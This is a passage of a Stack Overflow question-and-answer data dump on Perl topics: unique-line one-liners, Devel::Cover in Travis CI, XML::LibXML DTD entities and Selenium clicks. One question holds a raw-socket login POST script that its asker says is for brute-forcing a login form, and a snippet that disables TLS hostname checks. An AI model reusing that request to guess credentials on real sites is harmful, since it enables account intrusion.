-e '@a = @ARGV; ++$c{$_} while &lt;&gt;; @ARGV = @a; $c{$_} == 1 and print while &lt;&gt;;'  myfile.txt\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>line3\nline4\nline5\n</code></pre>\n\n<p>This is a slightly shorter alternative, but it uses double the amount of memory to store the file data</p>\n\n<pre><code>perl -e '@l = &lt;&gt;; ++$c{$_} for @l; $c{$_} == 1 and print for @l;' myfile.txt\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 59, "user_id": 5405540, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-TTokB9qeY9M/AAAAAAAAAAI/AAAAAAAAAO0/LVXO5Mvtufg/photo.jpg?sz=128", "display_name": "Mohima Chaudhuri", "link": "https://stackoverflow.com/users/5405540/mohima-chaudhuri"}, "is_accepted": false, "score": 1, "last_activity_date": 1497336463, "creation_date": 1497336463, "answer_id": 44514194, "question_id": 44377390, "link": "https://stackoverflow.com/questions/44377390/perl-dont-print-any-lines-that-are-duplicates/44514194#44514194", "title": "Perl: Don&#39;t print any lines that are duplicates", "body": "<p>This should work although it's a Unix solution:</p>\n\n<pre><code>sort file1|uniq -u\n</code></pre>\n\n<p><em>line3<br>\nline4<br>\nline5</em>  </p>\n\n<p>where file1 has:<br>\n<em>line1<br>\nline2<br>\nline2<br>\nline3<br>\nline1<br>\nline4<br>\nline5</em></p>\n\n<p>The -u option of the uniq command lists only non-duplicate entries, and uniq works on a sorted output</p>\n"}], "owner": {"reputation": 469, "user_id": 3000685, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/d94fa8d3249e2f10ccb693993c0db6ba?s=128&d=identicon&r=PG&f=1", "display_name": "secJ", "link": "https://stackoverflow.com/users/3000685/secj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 696, "favorite_count": 0, "accepted_answer_id": 44377548, "answer_count": 4, "score": 1, "last_activity_date": 1497336463, "creation_date": 1496695488, "last_edit_date": 1496699444, "question_id": 44377390, "link": "https://stackoverflow.com/questions/44377390/perl-dont-print-any-lines-that-are-duplicates", "title": "Perl: Don&#39;t print any lines that are duplicates", "body": "<p>What is a Perl one-liner to only print those lines that only ever appear once (that is, do not print if it appears more than once--the truly unique lines)?</p>\n\n<p>For example, if I have a file that contains duplicate lines:</p>\n\n<pre><code>line1\nline2\nline2\nline3\nline1\nline4\nline5\n</code></pre>\n\n<p>The output should be:</p>\n\n<pre><code>line3\nline4\nline5\n</code></pre>\n\n<p>I can do <code>perl -ne 'print if $a{$_}++' file</code> to see only the lines that are duplicates...</p>\n\n<pre><code>line2\nline1\n</code></pre>\n\n<p>I can swap the <code>if</code> for its antonym, <code>unless</code>, and see only one occurrence of each line in the file...</p>\n\n<pre><code>perl -ne 'print unless $a{$_}++' file\nline1\nline2\nline3\nline4\nline5\n</code></pre>\n\n<p>I'm assuming I have to slurp the entire file in and process it using single <code>\\n</code> delimiters for each line, maybe into a hash?  Just not sure how to do that. </p>\n"}, {"tags": ["perl", "travis-ci", "devel-cover"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1496693011, "post_id": 44376501, "comment_id": 75754532, "body": "I was actually wondering about that in the frontend repository when I was fixing a bug a few month ago. I ran it locally and it captured a lot of stuff."}, {"owner": {"reputation": 5099, "user_id": 406224, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9bc79fa6fa58e2a4f5e6c2f803cabc48?s=128&d=identicon&r=PG", "display_name": "oalders", "link": "https://stackoverflow.com/users/406224/oalders"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496758947, "post_id": 44376501, "comment_id": 75784873, "body": "@simbabque thanks for your bug fixes :)"}], "answers": [{"tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 4, "last_activity_date": 1496693106, "creation_date": 1496693106, "answer_id": 44376821, "question_id": 44376501, "link": "https://stackoverflow.com/questions/44376501/how-to-force-develcover-to-ignore-a-folder-when-using-perl-helpers-via-travis/44376821#44376821", "title": "How to force Devel::Cover to ignore a folder when using perl-helpers via Travis CI", "body": "<p>The syntax for the Devel::Cover options on the command line is weird. You need to put stuff comma-separated. At least when you use <code>PERL5OPT</code>.</p>\n\n<pre><code>DEVEL_COVER_OPTIONS=\"-ignore,^local/\"\n</code></pre>\n\n<p>See for example <a href=\"https://github.com/simbabque/AWS-S3/blob/master/.travis.yml#L26\" rel=\"nofollow noreferrer\">https://github.com/simbabque/AWS-S3/blob/master/.travis.yml#L26</a>, where it's a whole lot of stuff with commas.</p>\n\n<blockquote>\n<pre><code>PERL5OPT=-MDevel::Cover=-ignore,\"t/\",+ignore,\"prove\",-coverage,statement,branch,condition,path,subroutine prove -lrs t\n</code></pre>\n</blockquote>\n"}], "owner": {"reputation": 5099, "user_id": 406224, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9bc79fa6fa58e2a4f5e6c2f803cabc48?s=128&d=identicon&r=PG", "display_name": "oalders", "link": "https://stackoverflow.com/users/406224/oalders"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 246, "favorite_count": 1, "accepted_answer_id": 44376821, "answer_count": 1, "score": 4, "last_activity_date": 1496693106, "creation_date": 1496691741, "question_id": 44376501, "link": "https://stackoverflow.com/questions/44376501/how-to-force-develcover-to-ignore-a-folder-when-using-perl-helpers-via-travis", "title": "How to force Devel::Cover to ignore a folder when using perl-helpers via Travis CI", "body": "<p>The MetaCPAN Travis CI coverage builds are quite slow.  See <a href=\"https://travis-ci.org/metacpan/metacpan-web/builds/238884497\" rel=\"nofollow noreferrer\">https://travis-ci.org/metacpan/metacpan-web/builds/238884497</a>  This is likely in part because we're not successfully ignoring the <code>/local</code> folder that gets created by <code>Carton</code> as part of our build.  See  <a href=\"https://coveralls.io/builds/11809290\" rel=\"nofollow noreferrer\">https://coveralls.io/builds/11809290</a></p>\n\n<p>We're using <code>perl-helpers</code> to help with our Travis configuration.  I thought I should be able to use the <code>DEVEL_COVER_OPTIONS</code> environment variable in order to fix this, but I guess I don't have the correct incantation.  I've included the entire config below because a few snippets out of context seemed misleading.</p>\n\n<pre><code>language: perl\nperl:\n  - \"5.22\"\n\nmatrix:\n  fast_finish: true\n  allow_failures:\n    - env: COVERAGE=1 USE_CPANFILE_SNAPSHOT=true\n    - env: USE_CPANFILE_SNAPSHOT=false HARNESS_VERBOSE=1\nenv:\n  global:\n    # Carton --deployment only works on the same version of perl\n    # that the snapshot was built from.\n    - DEPLOYMENT_PERL_VERSION=5.22\n    - DEVEL_COVER_OPTIONS=\"-ignore ^local/\"\n  matrix:\n\n    # Get one passing run with coverage and one passing run with Test::Vars\n    # checks.  If run together they more than double the build time.\n    - COVERAGE=1 USE_CPANFILE_SNAPSHOT=true\n    - USE_CPANFILE_SNAPSHOT=false HARNESS_VERBOSE=1\n    - USE_CPANFILE_SNAPSHOT=true\n\nbefore_install:\n  - git clone git://github.com/travis-perl/helpers ~/travis-perl-helpers\n  - source ~/travis-perl-helpers/init\n\n  - npm install -g less js-beautify\n  # Pre-install from backpan to avoid upgrade breakage.\n  - cpanm -n http://cpan.metacpan.org/authors/id/M/ML/MLEHMANN/common-sense-3.6.tar.gz\n  - cpanm -n App::cpm Carton\n\ninstall:\n  - cpan-install --coverage   # installs converage prereqs, if enabled\n  - 'cpm install `test \"${USE_CPANFILE_SNAPSHOT}\" = \"false\" &amp;&amp; echo \" --resolver metadb\" || echo \" --resolver snapshot\"`'\n\nbefore_script:\n  - coverage-setup\n\nscript:\n  # Devel::Cover isn't in the cpanfile\n  # but if it's installed into the global dirs this should work.\n  - carton exec prove -lr -j$(test-jobs) t\n\nafter_success:\n  - coverage-report\n\nnotifications:\n  email:\n    recipients:\n      - olaf@seekrit.com\n    on_success: change\n    on_failure: always\n  irc: \"irc.perl.org#metacpan-travis\"\n\n# Use newer travis infrastructure.\nsudo: false\ncache:\n  directories:\n    - local\n</code></pre>\n"}, {"tags": ["perl", "url", "read-data"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 3, "creation_date": 1496689027, "post_id": 44375707, "comment_id": 75752573, "body": "Is this for educational purposes? Why do you not simply use LWP?"}, {"owner": {"reputation": 302, "user_id": 5715919, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh3.googleusercontent.com/-wlwf_kLIUqc/AAAAAAAAAAI/AAAAAAAAAH0/yRSQ3TifVF8/photo.jpg?sz=128", "display_name": "Seakleng Say", "link": "https://stackoverflow.com/users/5715919/seakleng-say"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496717499, "post_id": 44375707, "comment_id": 75761711, "body": "i want to testing my website . the code above i using blueforce and check by getting data"}], "answers": [{"comments": [{"owner": {"reputation": 302, "user_id": 5715919, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh3.googleusercontent.com/-wlwf_kLIUqc/AAAAAAAAAAI/AAAAAAAAAH0/yRSQ3TifVF8/photo.jpg?sz=128", "display_name": "Seakleng Say", "link": "https://stackoverflow.com/users/5715919/seakleng-say"}, "edited": false, "score": 1, "creation_date": 1496717088, "post_id": 44376393, "comment_id": 75761636, "body": "sorry i still dont understand . i want to get content data using like this code with SSL that i post   my $ua  = LWP::UserAgent-&gt;new(         ssl_opts =&gt; { verify_hostname =&gt; 0 },     );      my $response = $ua-&gt;get(&#39;<a href=\"https://www.facebook.com/suond.loyal&#39;\" rel=\"nofollow noreferrer\">facebook.com/suond.loyal&#39;</a>);     print $response-&gt;content, &quot;\\n&quot;;"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 302, "user_id": 5715919, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh3.googleusercontent.com/-wlwf_kLIUqc/AAAAAAAAAAI/AAAAAAAAAH0/yRSQ3TifVF8/photo.jpg?sz=128", "display_name": "Seakleng Say", "link": "https://stackoverflow.com/users/5715919/seakleng-say"}, "edited": false, "score": 0, "creation_date": 1496730744, "post_id": 44376393, "comment_id": 75765825, "body": "@SeaklengSay did you try this?"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 2, "last_activity_date": 1496691267, "creation_date": 1496691267, "answer_id": 44376393, "question_id": 44375707, "link": "https://stackoverflow.com/questions/44375707/how-to-read-data-from-a-url/44376393#44376393", "title": "how to read data from a URL", "body": "<p>The <a href=\"https://metacpan.org/pod/Net::SSLeay::Handle#SYNOPSIS\" rel=\"nofollow noreferrer\">synopsis</a> of Net::SSLeay::Handle suggest to simply <code>print</code> to the handle (emphasis mine).</p>\n\n<pre><code>use Net::SSLeay::Handle qw/shutdown/;\nmy ($host, $port) = (\"localhost\", 443);\n\ntie(*SSL, \"Net::SSLeay::Handle\", $host, $port);\n\nprint SSL \"GET / HTTP/1.0\\r\\n\";\nshutdown(\\*SSL, 1);\nprint while (&lt;SSL&gt;);                          # &lt;------- here\nclose SSL;\n</code></pre>\n"}], "owner": {"reputation": 302, "user_id": 5715919, "user_type": "registered", "accept_rate": 25, "profile_image": "https://lh3.googleusercontent.com/-wlwf_kLIUqc/AAAAAAAAAAI/AAAAAAAAAH0/yRSQ3TifVF8/photo.jpg?sz=128", "display_name": "Seakleng Say", "link": "https://stackoverflow.com/users/5715919/seakleng-say"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 216, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1496691267, "creation_date": 1496688552, "question_id": 44375707, "link": "https://stackoverflow.com/questions/44375707/how-to-read-data-from-a-url", "title": "how to read data from a URL", "body": "<p>Is there a anyway to read data from a URL with SSL after with using </p>\n\n<pre><code>tie(*SSL, \"Net::SSLeay::Handle\", $host, $port);\n</code></pre>\n\n<p>my code below</p>\n\n<pre><code>my $a = \"POST /login.php HTTP/1.1\";\nmy $b = \"Host: www.test.com\";\nmy $c = \"Connection: close\";\nmy $e = \"Cache-Control: max-age=0\";\nmy $f = \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\";\nmy $g = \"Origin: https://www.facebook.com\";\nmy $h = \"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31\";\nmy $i = \"Content-Type: application/x-www-form-urlencoded\";\nmy $j = \"Accept-Encoding: gzip,deflate,sdch\";\nmy $k = \"Accept-Language: en-US,en;q=0.8\";\nmy $l = \"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\";\n\nmy $cookie = \"cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa\";\nmy $post = \"lsd=AVpD2t1f&amp;display=&amp;enable_profile_selector=&amp;legacy_return=1&amp;next=&amp;profile_selector_ids=&amp;trynum=1&amp;timezone=300&amp;lgnrnd=031110_Euoh&amp;lgnjs=1366193470&amp;email=$user&amp;pass=$user&amp;default_persistent=0&amp;login=Log+In\";\nmy $cl = length($post);\nmy $d = \"Content-Length: $cl\";\n\n\nmy ($host, $port) = (\"www.test.com\", 443);\n\ntie(*SSL, \"Net::SSLeay::Handle\", $host, $port);\n\n\n\n\nprint SSL \"$a\\n\";\nprint SSL \"$b\\n\";\nprint SSL \"$c\\n\";\nprint SSL \"$d\\n\";\nprint SSL \"$e\\n\";\nprint SSL \"$f\\n\";\nprint SSL \"$g\\n\";\nprint SSL \"$h\\n\";\nprint SSL \"$i\\n\";\nprint SSL \"$j\\n\";\nprint SSL \"$k\\n\";\nprint SSL \"$l\\n\";\nprint SSL \"$cookie\\n\\n\";\n\nprint SSL \"$post\\n\";\n</code></pre>\n"}, {"tags": ["xml", "perl", "entity", "dtd", "xml-libxml"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1496691763, "post_id": 44373314, "comment_id": 75753940, "body": "The entity declarations are nodes of type <code>XML_ENTITY_DECL</code> that exist as children of the DTD node. <code>$node-&gt;addChild</code> doesn&#39;t support adding nodes of type <code>XML_ENTITY_DECL</code>, so you wouldn&#39;t be able to add one even if you could create it. Therefore, the parse-to-generate approach solution that&#39;s been posted is probably the only way to do what you want."}], "answers": [{"comments": [{"owner": {"reputation": 65, "user_id": 2455451, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8naQT.jpg?s=128&g=1", "display_name": "jesusbagpuss", "link": "https://stackoverflow.com/users/2455451/jesusbagpuss"}, "edited": false, "score": 0, "creation_date": 1496754027, "post_id": 44374640, "comment_id": 75781160, "body": "Thanks for the quick reply. I had read that in the documentation, but thought I might have been missing something e.g. in <code>XML::LibXML::Dtd</code>."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 3, "last_activity_date": 1496685232, "last_edit_date": 1496685232, "creation_date": 1496684516, "answer_id": 44374640, "question_id": 44373314, "link": "https://stackoverflow.com/questions/44373314/how-do-i-create-entity-references-in-the-doctype-using-perl-libxml/44374640#44374640", "title": "How do I create ENTITY references in the DOCTYPE using perl/LibXML", "body": "\n\n<p>The documentation for <a href=\"https://metacpan.org/pod/distribution/XML-LibXML/lib/XML/LibXML/Document.pod\" rel=\"nofollow noreferrer\"><code>XML::LibXML::Document</code></a>\nsays this</p>\n\n<blockquote>\n  <p>[The Document Class] inherits all functions from <code>XML::LibXML::Node</code> as specified in the DOM\n  specification. This enables access to the nodes besides the root element\n  on document level - a \"DTD\" for example. The support for these nodes is\n  limited at the moment.</p>\n</blockquote>\n\n<p>It also makes it clear later on that the source of these limitations is <code>libxml2</code> itself, not the Perl module. This makes sense, as the DTD has a completely different syntax from XML (or even an XML Processing Instruction) even though it may look superficially similar.</p>\n\n<p>The only way appears to be to parse a basic document with the required DTD and work with that</p>\n\n<p>Like so</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\n\nuse XML::LibXML;\n\nmy $doc = XML::LibXML-&gt;load_xml(string =&gt; &lt;&lt;__END_XML__);\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\" ?&gt;\n&lt;!DOCTYPE LinkSet PUBLIC \"-//NLM//DTD LinkOut 1.0//EN\" \"https://www.ncbi.nlm.nih.gov/projects/linkout/doc/LinkOut.dtd\" \n[\n  &lt;!ENTITY icon.url \"https://example.com/icon.png\"&gt; \n  &lt;!ENTITY base.url \"https://example.com/content/\"&gt;\n]&gt;\n\n&lt;LinkSet/&gt;\n__END_XML__\n\nprint $doc;\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-xml prettyprint-override\"><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?&gt;\n&lt;!DOCTYPE LinkSet PUBLIC \"-//NLM//DTD LinkOut 1.0//EN\" \"https://www.ncbi.nlm.nih.gov/projects/linkout/doc/LinkOut.dtd\" [\n&lt;!ENTITY icon.url \"https://example.com/icon.png\"&gt;\n&lt;!ENTITY base.url \"https://example.com/content/\"&gt;\n]&gt;\n&lt;LinkSet/&gt;\n</code></pre>\n"}], "owner": {"reputation": 65, "user_id": 2455451, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/8naQT.jpg?s=128&g=1", "display_name": "jesusbagpuss", "link": "https://stackoverflow.com/users/2455451/jesusbagpuss"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 409, "favorite_count": 0, "accepted_answer_id": 44374640, "answer_count": 1, "score": 4, "last_activity_date": 1496685232, "creation_date": 1496679703, "last_edit_date": 1496683047, "question_id": 44373314, "link": "https://stackoverflow.com/questions/44373314/how-do-i-create-entity-references-in-the-doctype-using-perl-libxml", "title": "How do I create ENTITY references in the DOCTYPE using perl/LibXML", "body": "<p>I'm trying to create the following DTD containing entity declarations:</p>\n\n<pre><code>&lt;!DOCTYPE LinkSet PUBLIC \"-//NLM//DTD LinkOut 1.0//EN\" \"https://www.ncbi.nlm.nih.gov/projects/linkout/doc/LinkOut.dtd\" \n[ &lt;!ENTITY icon.url \"https://example.com/icon.png\"&gt; \n&lt;!ENTITY base.url \"https://example.com/content/\" &gt; ]&gt;\n</code></pre>\n\n<p>I can successfully create the DOCTYPE <em>without</em> the entity references:</p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse XML::LibXML;\n\nmy $doc = XML::LibXML::Document-&gt;new('1.0','UTF-8');\nmy $dtd = $doc-&gt;createInternalSubset( \"LinkSet\", \"-//NLM//DTD LinkOut 1.0//EN\", \"https://www.ncbi.nlm.nih.gov/projects/linkout/doc/LinkOut.dtd\" );\n\nmy $ls = $doc-&gt;createElement( \"LinkSet\" );\n$doc-&gt;setDocumentElement($ls);\n\nprint $doc-&gt;toString;\nexit;\n</code></pre>\n\n<p>Results in:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE LinkSet PUBLIC \"-//NLM//DTD LinkOut 1.0//EN\" \"https://www.ncbi.nlm.nih.gov/projects/linkout/doc/LinkOut.dtd\"&gt;\n&lt;LinkSet/&gt;\n</code></pre>\n\n<p>The <a href=\"http://search.cpan.org/dist/XML-LibXML/lib/XML/LibXML/Document.pod#createEntityReference\" rel=\"nofollow noreferrer\">XML::LibXML documentation</a> shows how to add an entity reference to a document, but not how to declare an entity in the DOCTYPE.</p>\n\n<p>A <a href=\"https://stackoverflow.com/questions/27876393/adding-entity-nbsp-160-to-the-doctype-using-php-dom\">similar (but PHP-based) question</a> points to creating the ENTITY references as a string and parsing that.\nIs this the best approach in Perl too?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "edited": false, "score": 3, "creation_date": 1496676006, "post_id": 44372171, "comment_id": 75745458, "body": "What you have shown is not a syntax error, what is the surrounding code?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 5, "creation_date": 1496676089, "post_id": 44372171, "comment_id": 75745515, "body": "Your code doesn&#39;t generate a syntax error in any version of Perl. Furthermore, the error &quot;syntax error near unexpected token&quot; is not a Perl error message. So I expect there&#39;s something you&#39;re not telling us about how this code is run."}, {"owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "edited": false, "score": 4, "creation_date": 1496676179, "post_id": 44372171, "comment_id": 75745561, "body": "Are you sure you are invoking the <code>perl</code> interpreter? This looks like you are running it against the <code>bash</code> interpreter."}, {"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 1, "creation_date": 1496676215, "post_id": 44372171, "comment_id": 75745584, "body": "<code>perl -c -e &#39;process_command_line(&quot;dummy&quot;)&#39;</code> results in <code>syntax OK</code>."}, {"owner": {"reputation": 1, "user_id": 8114988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd2db924fa7aac850fc73f6f9eb74ff2?s=128&d=identicon&r=PG&f=1", "display_name": "Drosophila virilis", "link": "https://stackoverflow.com/users/8114988/drosophila-virilis"}, "edited": false, "score": 0, "creation_date": 1496761413, "post_id": 44372171, "comment_id": 75786818, "body": "Thanks for the comments. That is what I<code>m getting. As I said I don</code>t understand perl well. The problem might be because I<code>m running through another script. I</code>ll try to figure it out"}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 4, "last_activity_date": 1496677413, "creation_date": 1496677413, "answer_id": 44372608, "question_id": 44372171, "link": "https://stackoverflow.com/questions/44372171/perl-script-gives-a-syntax-error-with-perl-v5-20-but-not-with-v5-10/44372608#44372608", "title": "Perl script gives a syntax error with Perl v5.20 but not with v5.10", "body": "<p>You are executing your Perl script using <code>sh</code> (or similar) instead of <code>perl</code>. Use <code>perl</code> to execute your Perl script.</p>\n\n<pre><code>$ cat a.pl\nprocess_command_line(\"dummy\");\n\n$ sh a.pl\na.pl: line 1: syntax error near unexpected token `\"dummy\"'\na.pl: line 1: `process_command_line(\"dummy\");'\n\n$ perl a.pl\nUndefined subroutine &amp;main::process_command_line called at a.pl line 1.\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 8114988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd2db924fa7aac850fc73f6f9eb74ff2?s=128&d=identicon&r=PG&f=1", "display_name": "Drosophila virilis", "link": "https://stackoverflow.com/users/8114988/drosophila-virilis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "closed_date": 1496735648, "answer_count": 1, "score": -5, "last_activity_date": 1496684900, "creation_date": 1496675842, "last_edit_date": 1496684900, "question_id": 44372171, "link": "https://stackoverflow.com/questions/44372171/perl-script-gives-a-syntax-error-with-perl-v5-20-but-not-with-v5-10", "closed_reason": "Not suitable for this site", "title": "Perl script gives a syntax error with Perl v5.20 but not with v5.10", "body": "<p>I have a program which has been working well for quite some time using Perl version 5.10.1.</p>\n\n<p>I now need to run it on version 5.20.2 because it is what is available, and I need a 64-bit environment.</p>\n\n<p>The problem is that under Perl v5.20 this line fails</p>\n\n<pre><code>process_command_line(\"dummy\");\n</code></pre>\n\n<p>with this error</p>\n\n<pre><code>line 16: syntax error near unexpected token `\"dummy\"'  \nline 16: `process_command_line(\"dummy\");'  \n</code></pre>\n\n<p>Why am I getting this error?</p>\n"}, {"tags": ["javascript", "perl", "selenium"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496674498, "post_id": 44371634, "comment_id": 75744580, "body": "Please <a href=\"https://stackoverflow.com/posts/44371634/edit\">edit</a> your question and clean up the code. Don&#39;t use code snippets for If there is nothing to run."}, {"owner": {"reputation": 1, "user_id": 8114945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6a3e515a164376f2cb194a3f9ca95ec?s=128&d=identicon&r=PG&f=1", "display_name": "CaptainNotSoObvious", "link": "https://stackoverflow.com/users/8114945/captainnotsoobvious"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496675544, "post_id": 44371634, "comment_id": 75745162, "body": "@simbabque - Done. Thanks!"}, {"owner": {"reputation": 1, "user_id": 8114945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6a3e515a164376f2cb194a3f9ca95ec?s=128&d=identicon&r=PG&f=1", "display_name": "CaptainNotSoObvious", "link": "https://stackoverflow.com/users/8114945/captainnotsoobvious"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1496765438, "post_id": 44371634, "comment_id": 75789610, "body": "I was able to solve this after adding a delay after clicking on the acmenuItemTR element."}], "owner": {"reputation": 1, "user_id": 8114945, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6a3e515a164376f2cb194a3f9ca95ec?s=128&d=identicon&r=PG&f=1", "display_name": "CaptainNotSoObvious", "link": "https://stackoverflow.com/users/8114945/captainnotsoobvious"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 43, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1496765291, "creation_date": 1496674186, "last_edit_date": 1496765291, "question_id": 44371634, "link": "https://stackoverflow.com/questions/44371634/not-able-to-click-on-a-popup-menu-using-selenium-perl", "title": "Not able to click on a popup menu using Selenium (Perl)", "body": "<p>I have the following html and I am trying to click on the last item \"Reporting Administration\". I have tried a bunch of things but am not able to.</p>\n\n<pre><code>&lt;td class=\"appOptionsContainer\"&gt;&lt;div id=\"goto_span\" style=\"position:relative; z-index:12\"&gt;&lt;div class=\"bannerOptionsButtonNormal\" role=\"button\" aria-haspopup=\"true\" tabindex=\"0\" onmouseover=\"this.className='bannerOptionsButtonOver';\" onmouseout=\"this.className='bannerOptionsButtonNormal';\" onkeypress=\"return CCPopupMenu.dropDown(event,0,0,'goto');\" onclick=\"return CCPopupMenu.dropDown(event,0,0,'goto');\" title=\"Launch Options\"&gt;&lt;table cellspacing=\"0\" cellpadding=\"0\" class=\"bannerOptions\" role=\"presentation\"&gt;&lt;tr&gt;&lt;td nowrap 